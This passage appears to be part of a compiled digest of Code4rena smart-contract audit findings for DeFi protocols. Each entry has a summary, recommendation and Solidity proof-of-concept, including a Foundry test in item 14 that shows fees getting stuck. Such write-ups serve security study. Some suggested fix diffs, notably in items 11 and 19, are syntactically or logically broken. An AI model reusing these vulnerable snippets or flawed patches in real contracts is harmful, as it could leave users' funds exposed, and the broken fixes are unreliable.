  *       if (block.timestamp >= _start -  __initialUnlockTimeOffset + _duration) return _totalAmount; // Fully vested
          _start = _start - __initialUnlockTimeOffset; // Offset initial unlock so it's claimable immediately
          return (_totalAmount * (block.timestamp - _start)) / _duration; // Partially vested

  }

  ```

  </details>

## 11. Incorrect Expiry Used in getHlPrices Function When Burning A Product ID Allow Double Withdrawal Exploit in DNT Vaults

### Expiry calculation

- Summary: The `getHlPrices` function in DNT Vaults can use incorrect expiry times when calculating settlements, leading to potential double withdrawal exploits. If the `burn()` function is called after the product's actual expiry, it may include prices beyond the intended expiry, resulting in incorrect payoffs. Attackers can exploit this by burning tokens at different times to favor either the minter or the maker, enabling them to double withdraw and drain the protocol. This issue affects all DNT Vaults.

- Impact & Recommendation: Ensure the settlement time in DNT Vaults is always equal to or less than the product's real expiry.
  <br> 🐬: [Source](https://code4rena.com/reports/2024-05-sofa-pro-league#h-02-incorrect-expiry-used-in-gethlprices-function-when-burning-a-product-id-allow-double-withdrawal-exploit-in-dnt-vaults) & [Report](https://code4rena.com/reports/2024-05-sofa-pro-league)

  <details><summary>POC</summary>

  ```solidity
    function _burn(uint256 term, uint256 expiry, uint256[2] memory anchorPrices, uint256 isMaker) internal nonReentrant returns (uint256 payoff) {
        uint256 productId = getProductId(term, expiry, anchorPrices, isMaker);
        (uint256 latestTerm, bool _isBurnable) = isBurnable(term, expiry, anchorPrices);
        require(_isBurnable, "Vault: not burnable");
        // check if settled
    -        uint256 latestExpiry = (block.timestamp - 28800) / 86400 * 86400 + 28800;
    +        uint256 current = (block.timestamp - 28800) / 86400 * 86400 + 28800;
    +        uint256 latestExpiry = current > expiry ? expiry : current
        require(ORACLE.settlePrices(latestExpiry, 1) > 0, "Vault: not settled");
        // more code ...
    }
    function _burnBatch(Product[] calldata products) internal nonReentrant returns (uint256 totalPayoff) {
            //some code ..
        for (uint256 i = 0; i < products.length; i++) {
            // check if settled
    -            uint256 latestExpiry = (block.timestamp - 28800) / 86400 * 86400 + 28800;
    +            Product memory product = products[i];
    +            uint256 current = (block.timestamp - 28800) / 86400 * 86400 + 28800;
    +            uint256 latestExpiry = current > product.expiry ? product.expiry  : current
    +            require(ORACLE.settlePrices(latestExpiry, 1) > 0, "Vault: not settled");
    -            Product memory product = products[i];
            }
            // more code ....
        }

  ```

  </details>

## 12.[Medium] Initial mint amount of TRNDO is wrong

### `100_000_000` instead of `10e8`

- Summary: The constructor of the `TornadoBlastBotToken` contract incorrectly mints 1 billion TRNDO tokens to the owner instead of the intended 100 million. The code uses `10e8`, which represents one billion, rather than the correct amount for 100 million.

- Impact & Recommendation: Consider using `100_000_000` instead of `10e8`, which is much more readeable.
  <br> 🐬: [Source](https://code4rena.com/reports/2024-06-tornadoblast-proleague#m-02-initial-mint-amount-of-trndo-is-wrong) & [Report](https://code4rena.com/reports/2024-06-tornadoblast-proleague)

<details><summary>POC</summary>

```solidity
- _mint(msg.sender, 10e8 * 10 ** decimals()); // 100 million
+ _mint(msg.sender, 100_000_000 * 10 ** decimals()); // 100 million

```

</details>

## 13.[Medium] Rounding-down of flashFee can result in calls to flash loan to revert

### Rounding-up of flashFee

- Summary: The `BalancerFlashLender::flashFee()` function's rounding-down approach can cause flash loan calls to revert due to insufficient approval amounts. The protocol's flash loan provider expects a rounded-up fee, leading to approval discrepancies.

- Impact & Recommendation: To fix this, the fee calculation should round up using a method like `mulDivUp`, ensuring the protocol provides adequate approval amounts.
  <br> 🐬: [Source](https://code4rena.com/reports/2024-05-bakerfi#m-07-rounding-down-of-flashfee-can-result-in-calls-to-flash-loan-to-revert) & [Report](https://code4rena.com/reports/2024-05-bakerfi)

<details><summary>POC</summary>

```solidity
File: contracts/core/flashloan/BalancerFlashLender.sol
    function flashFee(address, uint256 amount) external view override returns (uint256) {
        uint256 perc = _balancerVault.getProtocolFeesCollector().getFlashLoanFeePercentage();
        if (perc == 0 || amount == 0) {
            return 0;
        }
@--->   return (amount * perc) / _BALANCER_MAX_FEE_PERCENTAGE;
    }

File: contracts/core/strategies/StrategyLeverage.sol
    function deploy() external payable onlyOwner nonReentrant returns (uint256 deployedAmount) {
        if (msg.value == 0) revert InvalidDeployAmount();
        // 1. Wrap Ethereum
        address(wETHA()).functionCallWithValue(abi.encodeWithSignature("deposit()"), msg.value);
        // 2. Initiate a WETH Flash Loan
        uint256 leverage = calculateLeverageRatio(
            msg.value,
            getLoanToValue(),
            getNrLoops()
        );
        uint256 loanAmount = leverage - msg.value;
@--->   uint256 fee = flashLender().flashFee(wETHA(), loanAmount);
        //§uint256 allowance = wETH().allowance(address(this), flashLenderA());
@--->   if(!wETH().approve(flashLenderA(), loanAmount + fee)) revert FailedToApproveAllowance();
        if (
            !flashLender().flashLoan(
                IERC3156FlashBorrowerUpgradeable(this),
                wETHA(),
                loanAmount,
                abi.encode(msg.value, msg.sender, FlashLoanAction.SUPPLY_BOORROW)
            )
        ) {
            revert FailedToRunFlashLoan();
        }
        deployedAmount = _pendingAmount;
        _deployedAmount = _deployedAmount + deployedAmount;
        emit StrategyAmountUpdate(_deployedAmount);
        // Pending amount is not cleared to save gas
        // _pendingAmount = 0;
    }

```

</details>

## 14.[Medium] Stuck rewards in FeeSplitter contract

### Precision loss in reward calculations

- Summary: The FeeSplitter contract in the Curves protocol has a flaw causing rewards to become stuck due to precision loss in reward calculations as token supply increases and the absence of a withdraw function. This issue leads to unclaimable excess rewards accumulating in the contract, which grow with each token transaction.

- Impact & Recommendation: Rewards become increasingly trapped, highlighting the need to either implement a withdrawal mechanism or adjust the reward calculation to prevent future stuck rewards.
  <br> 🐬: [Source](https://code4rena.com/reports/2024-01-curves#m-05-stuck-rewards-in-feesplitter-contract) & [Report](https://code4rena.com/reports/2024-01-curves)

<details><summary>POC</summary>

```solidity


├── 2024-01-curves
│ ├── test
│ ├──FeeSplitterTest.t.sol

// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.7;
import {Test, console2} from "forge-std/Test.sol";
import {Curves} from "../contracts/Curves.sol";
import {CurvesERC20Factory} from "../contracts/CurvesERC20Factory.sol";
import {FeeSplitter} from "../contracts/FeeSplitter.sol";
import {CurvesERC20} from "../contracts/CurvesERC20.sol";
import "@openzeppelin/contracts/utils/Strings.sol";
contract FeeSplitterTest is Test {
    Curves public curves;
    CurvesERC20Factory public factory;
    FeeSplitter public feeSplitter;
    //fees:
    uint256 i_protocolFee = 5e16; // 5%
    uint256 i_subjectFee = 5e16; // 5%
    uint256 i_referralFee = 0; // 0%
    uint256 i_holdersFee = 5e16; // 5%
    //fee destination:
    address protocolFeeDestination = makeAddr("protocolFeeDestination");
    //subjects addresses:
    address subjectOne = makeAddr("subjectOne");
    //subject tokens addresses:
    address subjectOneToken;
    function setUp() public {
        //1. deploy required contracts:
        feeSplitter = new FeeSplitter();
        factory = new CurvesERC20Factory();
        curves = new Curves(address(factory), address(feeSplitter));
        feeSplitter.setCurves(curves);
        //2. set fees:
        curves.setMaxFeePercent(i_protocolFee + i_subjectFee + i_holdersFee);
        curves.setProtocolFeePercent(i_protocolFee, protocolFeeDestination);
        curves.setExternalFeePercent(i_subjectFee, i_referralFee, i_holdersFee);
        //3.add a subject token:
        vm.startPrank(subjectOne);
        curves.buyCurvesTokenWithName(subjectOne, 1, "subjectOne", curves.DEFAULT_SYMBOL());
        subjectOneToken = curves.symbolToSubject("CURVES1");
        vm.stopPrank();
    }
    function testSetUp() public {
        // test fee setup:
        (uint256 protocolFee, uint256 subjectFee, uint256 referralFee, uint256 holdersFee, ) = curves.getFees(1 ether);
        assertGt(protocolFee, 0);
        assertGt(subjectFee, 0);
        assertEq(referralFee, 0);
        assertGt(holdersFee, 0);
        // test if subject token is created:
        assertFalse(subjectOneToken == address(0));
    }
    //! forge test --mt testDrainFeeSplitter
    function testDrainFeeSplitter() public {
        uint256 numberOfBuyers = 100;
        address[] memory buyers = new address[](numberOfBuyers);
        uint256 boughtAmount = 200; // each one of the buyers will buy 200 subject tokens
        //1. 100 users buy subjectOne token:
        for (uint256 i; i < numberOfBuyers; ++i) {
            buyers[i] = makeAddr(string(Strings.toString(i)));
            uint256 buyerBalanceBefore = curves.curvesTokenBalance(subjectOne, buyers[i]);
            assert(buyerBalanceBefore == 0);
            uint256 price = curves.getBuyPriceAfterFee(subjectOne, boughtAmount + i);
            vm.deal(buyers[i], price);
            vm.startPrank(buyers[i]);
            curves.buyCurvesToken{value: price}(subjectOne, boughtAmount + i);
            vm.stopPrank();
            uint256 buyerBalanceAfter = curves.curvesTokenBalance(subjectOne, buyers[i]);
            assert(buyerBalanceAfter == boughtAmount + i);
        }
        uint256 feeSplitterBalanceBeforeClaims = address(feeSplitter).balance;
        // 2. now these users will claim their rewards from the splitter contract:
        uint256 totalClaimableByUsers;
        for (uint256 i; i < numberOfBuyers; ++i) {
            uint256 buyerETHBalanceBefore = buyers[i].balance;
            assert(buyerETHBalanceBefore == 0);
            uint256 claimedFeesByBuyer = feeSplitter.getClaimableFees(subjectOne, buyers[i]);
            vm.startPrank(buyers[i]);
            feeSplitter.claimFees(subjectOne);
            vm.stopPrank();
            uint256 buyerETHBalanceAfter = buyers[i].balance;
            assertGt(buyerETHBalanceAfter, buyerETHBalanceBefore);
            assert(buyerETHBalanceAfter == claimedFeesByBuyer);
            totalClaimableByUsers += claimedFeesByBuyer;
        }
        //3. As can be noticed: the splitter balance is larger than the claimable rewards which will result in the difference being stuck in the contract:
        uint256 feeSplitterBalanceAfterClaims = address(feeSplitter).balance;
        assertGt(totalClaimableByUsers - feeSplitterBalanceAfterClaims, 0); // stucke balance
        assert(feeSplitterBalanceBeforeClaims - totalClaimableByUsers == feeSplitterBalanceAfterClaims);
        console2.log("totalClaimableByUsers (# of ETH): ", totalClaimableByUsers / 1e18);
        console2.log("--------------------------------------------------");
        console2.log("stuck rewards in the splitter contract (# of ETH): ", feeSplitterBalanceAfterClaims / 1e18);
        //4. to prove it more, another purchase is made, and the buyer claimed his rewards while the stuck amount is increased:
        address lastBuyer = makeAddr("lastBuyer");
        uint256 price = curves.getBuyPriceAfterFee(subjectOne, boughtAmount);
        //---------- buying subjectOne tokens:
        vm.deal(lastBuyer, price);
        vm.startPrank(lastBuyer);
        curves.buyCurvesToken{value: price}(subjectOne, boughtAmount);
        //---------- lastBuyer claims his rewards:
        feeSplitter.claimFees(subjectOne);
        vm.stopPrank();
        //-----
        console2.log("--------------------------------------------------");
        console2.log(
            "stuck rewards in the splitter contract after the lastBuyer claimed his rewards (# of ETH): ",
            address(feeSplitter).balance / 1e18
        );
    }
}
```

</details>

## 15.[Medium] AprPremium calculation might be incorrect due to loss of precision

### Precision loss in APR premium calculations

- Summary: In the calculation of the APR premium there is a loss of precision. The `utilizationFactor` is in `PRECISION` (1e27), while `minPremium` is in BPS (1e4). However, in the `_calculateAprPremium()` function, the ratio of `totalOutstanding` to `totalAssets` is not properly scaled to BPS before adding `aprFactors.minPremium`. This leads to incorrect APR premium values, resulting in higher-than-expected APRs being validated.

- Impact & Recommendation: The recommended fix is to scale up `totalOutstanding` by 1e4 before performing the division and addition to ensure accurate APR premium calculations.
  <br> 🐬: [Source](https://code4rena.com/reports/2024-06-gondi#m-02-AprPremium-calculation-might-be-incorrect-due-to-loss-of-precision) & [Report](https://code4rena.com/reports/2024-06-gondi)

<details><summary>POC</summary>

```solidity
    /// @notice UtilizationFactor Expressed in `PRECISION`. minPremium in BPS
    struct AprFactors {
        uint128 minPremium;
        uint128 utilizationFactor;
    }

    function _calculateAprPremium() private view returns (uint128) {
        /// @dev cached
        Pool pool = Pool(getPool);
        AprFactors memory aprFactors = getAprFactors;
        uint256 totalAssets = pool.totalAssets();
        uint256 totalOutstanding = totalAssets - pool.getUndeployedAssets();
        return uint128(
|>          totalOutstanding.mulDivUp(aprFactors.utilizationFactor, totalAssets * PRECISION) + aprFactors.minPremium
        );
    }

```

</details>

## 16.[High] Duplicate strategies in Vault cause assets to be counted repeatedly

### Repeated counting of assets

- Summary: In the StrategVault smart contract, duplicate strategies can be set, leading to the repeated counting of assets. This issue allows malicious actors to exploit the protocol by inflating total assets and receiving disproportionate rewards.

- Impact & Recommendation: The oracleExit function in the strategies should be updated to prevent duplicate token counts. This can be achieved by utilizing the tokenExists function introduced in version 0.1.17 of the strateg-protocol-libraries, which helps avoid counting duplicate tokens.
  <br> 🐬: [Source](https://code4rena.com/reports/2024-06-strateg-proleague#h-01-duplicate-strategies-in-vault-cause-assets-to-be-counted-repeatedly) & [Report](https://code4rena.com/reports/2024-06-strateg-proleague)

<details><summary>POC</summary>

```solidity
    function _getNativeTVL() internal view returns (uint256) {
        address _asset = asset();
        DataTypes.OracleState memory oracleState;
        oracleState.vault = address(this);
        uint256 _strategyBlocksLength = strategyBlocksLength;
        if (_strategyBlocksLength == 0 || !isLive) {
            return IERC20(_asset).balanceOf(address(this)) + IERC20(_asset).allowance(buffer, address(this));
        } else if (_strategyBlocksLength == 1) {
            oracleState =
                IStrategStrategyBlock(strategyBlocks[0]).oracleExit(
                    oracleState,
                    LibBlock.getStrategyStorageByIndex(0),
                    10000
                );
        } else {
            uint256 revertedIndex = _strategyBlocksLength - 1;
            for (uint256 i = 0; i < _strategyBlocksLength; i++) {
                uint256 index = revertedIndex - i;
                oracleState = IStrategStrategyBlock(strategyBlocks[index]).oracleExit(
                    oracleState, LibBlock.getStrategyStorageByIndex(index), 10000
                );
            }
        }


```

</details>

## 17.[Medium] Rebasing WETH token on Blast is not taken into account in Tornado

### Rebasing WETH accounting

- Summary: The rebasing WETH token on Blast is not considered in Tornado's accounting, leading to potential problems in the `IndividualTokenMarket`. If the WETH balance increases due to yield generation, but only a fixed amount (e.g., 3 ether) is withdrawn, any excess yield remains trapped in the WETH contract. This is problematic since the WETH balance doesn't decrease as expected.

- Impact & Recommendation: Opt-out of WETH yield generation when creating the market.
  <br> 🐬: [Source](https://code4rena.com/reports/2024-06-tornado-launcher-proleague#m-01-Rebasing-WETH-token-on-Blast-is-not-taken-into-account-in-Tornado) & [Report](https://code4rena.com/reports/2024-06-tornado-launcher-proleague)

<details><summary>POC</summary>

```solidity

WETHTyped().withdraw(MAX_WETH_RESERVE());

```

</details>

## 18.[Medium] Incorrect comparison logic in post-operation checks

### Reversed >= <=

- Summary: The `_doCheckValueType` function in the `LeverageMacroBase` contract contains reversed logic for the `gte` (greater than or equal to) and `lte` (less than or equal to) comparisons, causing incorrect post-operation validations. This flaw can lead to improper validation of Collateralized Debt Position (CDP) states and potential system manipulation.

- Impact & Recommendation: Correct the comparison logic.
  <br> 🐬: [Source](https://code4rena.com/reports/2024-06-badger#m-01-Incorrect-comparison-logic-in-post-operation-checks) & [Report](https://code4rena.com/reports/2024-06-badger)

<details><summary>POC</summary>

```solidity

function _doCheckValueType(CheckValueAndType memory check, uint256 valueToCheck) internal {
    if (check.operator == Operator.skip) {
        // Early return
        return;
    } else if (check.operator == Operator.gte) {
        require(valueToCheck >= check.value, "!LeverageMacroReference: gte post check");
    } else if (check.operator == Operator.lte) {
        require(valueToCheck <= check.value, "!LeverageMacroReference: lte post check");
    } else if (check.operator == Operator.equal) {
        require(check.value == valueToCheck, "!LeverageMacroReference: equal post check");
    } else {
        revert("Operator not found");
    }
}

```

</details>

## 19.[Medium] The average price was calculated incorrectly

### Average price

- Summary: The calculation of the position's average price and the global average price incorrectly mixed raw price and price impact price without properly accounting for `priceImpactUsd` within the `PositionLogic.sol` contract. This led to incorrect determination of profit or loss for a position, as `priceImpactUsd` was not directly factored into the calculation.

- Impact & Recommendation: Modify the calculations to ensure that `priceImpactUsd` is correctly included in determining the profit or loss. Additionally, raw price should be used when calculating the delta of the position's profit or loss, rather than the price impact price.
  <br> 🐬: [Source](https://code4rena.com/reports/2024-jul-gemnify-proleague#h-06-The-average-price-was-calculated-incorrectly) & [Report](https://code4rena.com/reports/2024-jul-gemnify-proleague)

<details><summary>POC</summary>

```solidity
    function getNextAveragePrice(
        address _indexToken,
        uint256 _size,
        uint256 _averagePrice,
        bool _isLong,
        uint256 _nextPrice,
        uint256 _sizeDelta,
        uint256 _lastIncreasedTime
    ) internal view returns (uint256) {
        (bool hasProfit, uint256 delta) = getDelta(_indexToken, _size, _averagePrice, _isLong, _lastIncreasedTime);
        uint256 nextSize = _size + _sizeDelta;
        uint256 divisor;
+       uint256 priceImpactUsd;
+       uint256 rawPrice = _isLong ? GenericLogic.getMaxPrice(_indexToken) : GenericLogic.getMinPrice(_indexToken);
+       if (_nextPrice > rawPrice) {
+           priceImpactUsd = (_nextPrice - rawPrice) * (_sizeDelta / _nextPrice);
+       } else {
+           priceImpactUsd = (rawPrice - _nextPrice) * (_sizeDelta / _nextPrice);
+       }
+
        if (_isLong) {
            divisor = hasProfit ? nextSize + delta : nextSize - delta;
+           if(_nextPrice > rawPrice) { divisor - priceImpactUsd};
+           else {divisor + priceImpactUsd};
        } else {
            divisor = hasProfit ? nextSize - delta : nextSize + delta;
+           if(_nextPrice > rawPrice) { divisor + priceImpactUsd};
+           else {divisor - priceImpactUsd};
        }
-       return (_nextPrice * nextSize) / divisor;
+       return (rawPrice * nextSize) / divisor;
    }
    function getNextGlobalLongData(
        address _account,
        address _collateralToken,
        address _indexToken,
        uint256 _nextPrice,
        uint256 _sizeDelta,
        bool _isIncrease
    ) internal view returns (uint256) {
        DataTypes.PositionStorage storage ps = StorageSlot.getVaultPositionStorage();
        int256 realisedPnl = getRealisedPnl(_account, _collateralToken, _indexToken, _sizeDelta, _isIncrease, true);
        uint256 globalLongSize = ps.globalLongSizes[_indexToken];
        uint256 averagePrice = ps.globalLongAveragePrices[_indexToken];
+       uint256 rawPrice = GenericLogic.getMinPrice(_indexToken);
+       uint256 priceDelta = averagePrice > rawPrice ? averagePrice - rawPrice : rawPrice - averagePrice;
-       uint256 priceDelta = averagePrice > _nextPrice ? averagePrice - _nextPrice : _nextPrice - averagePrice;
...
         uint256 nextAveragePrice =
-           getNextGlobalAveragePrice(averagePrice, _nextPrice, nextSize, delta, realisedPnl, true);
+           getNextGlobalAveragePrice(averagePrice, _nextPrice, nextSize, delta, realisedPnl, true, _isIncrease);
    function getNextGlobalShortData(
        address _account,
        address _collateralToken,
        address _indexToken,
        uint256 _nextPrice,
        uint256 _sizeDelta,
        bool _isIncrease
    ) internal view returns (uint256) {
        DataTypes.PositionStorage storage ps = StorageSlot.getVaultPositionStorage();
        int256 realisedPnl = getRealisedPnl(_account, _collateralToken, _indexToken, _sizeDelta, _isIncrease, false);
        uint256 globalShortSize = ps.globalShortSizes[_indexToken];
        uint256 averagePrice = ps.globalShortAveragePrices[_indexToken];
+       uint256 rawPrice = GenericLogic.getMaxPrice(_indexToken);
+       uint256 priceDelta = averagePrice > rawPrice ? averagePrice - rawPrice : rawPrice - averagePrice;
-       uint256 priceDelta = averagePrice > _nextPrice ? averagePrice - _nextPrice : _nextPrice - averagePrice;
...
        uint256 nextAveragePrice =
-           getNextGlobalAveragePrice(averagePrice, _nextPrice, nextSize, delta, realisedPnl, false);
+           getNextGlobalAveragePrice(averagePrice, _nextPrice, nextSize, delta, realisedPnl, false, _isIncrease);
    function getNextGlobalAveragePrice(
        uint256 _averagePrice,
        uint256 _nextPrice,
        uint256 _nextSize,
        uint256 _delta,
        int256 _realisedPnl,
        bool _isLong,
+       bool _isIncrease
    ) internal pure returns (uint256) {
+       uint256 rawPrice = _isIncrease ? ( _isLong? GenericLogic.getMaxPrice(_indexToken) : GenericLogic.getMinPrice(_indexToken))  : (_isLong ? GenericLogic.getMinPrice(_indexToken) : GenericLogic.getMaxPrice(_indexToken));
-       (bool hasProfit, uint256 nextDelta) = getNextDelta(_delta, _averagePrice, _nextPrice, _realisedPnl, _isLong);
+       (bool hasProfit, uint256 nextDelta) = getNextDelta(_delta, _averagePrice, rawPrice, _realisedPnl, _isLong);
        uint256 divisor;
+       uint256 priceImpactUsd;
+       if (_nextPrice > rawPrice) {
+           priceImpactUsd = (_nextPrice - rawPrice) * (_sizeDelta / _nextPrice);
+       } else {
+           priceImpactUsd = (rawPrice - _nextPrice) * (_sizeDelta / _nextPrice);
+       }
+
        if (_isLong) {
            divisor = hasProfit ? _nextSize + nextDelta : _nextSize - nextDelta;
+           if(_nextPrice > rawPrice) { divisor - priceImpactUsd};
+           else {divisor + priceImpactUsd};
        } else {
            divisor = hasProfit ? _nextSize - nextDelta : _nextSize + nextDelta;
+           if(_nextPrice > rawPrice) { divisor + priceImpactUsd};
+           else {divisor - priceImpactUsd};
        }
-       return (_nextPrice * _nextSize) / divisor;
+       return (rawPrice * _nextSize) / divisor;
    }

```

</details>
